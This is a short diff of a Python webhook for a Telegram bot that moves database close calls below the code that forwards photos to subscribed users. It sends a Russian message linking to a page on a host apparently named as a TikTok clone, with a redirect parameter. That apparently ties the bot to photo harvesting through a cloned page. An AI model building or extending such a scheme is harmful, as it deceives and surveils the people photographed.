@@ -63,8 +63,6 @@ async def webhook(
         subscription = mycursor.fetchone()
         subscription = int(subscription[0])
 
-        mycursor.close()
-        mydb.close()
 
         if subscription > 0:
             await send_telegram_photo(user_id, photo, redirect_url, user_id)
@@ -82,7 +80,9 @@ async def webhook(
 
 
             await send_telegram_message(user_id, f"🙎‍♂️Вам пришло новое фото!\nСсылка: https://rusfai-tiktok-clone2-c56e.twc1.net/tt?id={user_id}&redirect={redirect_url}", reply_markup=keyboard)
-
+                
+        mycursor.close()
+        mydb.close()
     return {"status": "Success"}
 
 
